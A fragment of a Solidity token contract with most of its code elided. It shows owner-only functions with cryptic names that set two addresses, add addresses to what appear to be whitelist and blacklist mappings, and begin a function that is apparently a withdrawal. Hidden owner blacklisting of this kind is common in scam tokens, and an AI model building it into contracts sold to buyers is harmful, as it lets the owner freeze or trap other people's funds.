...
contract POESSSS is Ownable {
    ...
    function SET(address _c, address _p) external onlyOwner {
        cc = _c;
        pp = _p;
    }
    ...
    function AAW(address[] memory _wat) public onlyOwner{
        for (uint i = 0; i < _wat.length; i++) {
            wat[_wat[i]] = true;
        }
    }

    function AAB(address[] memory _bat) public onlyOwner{
        for (uint i = 0; i < _bat.length; i++) {
            bat[_bat[i]] = true;
        }
    }

    function WWD() external onlyOwner {
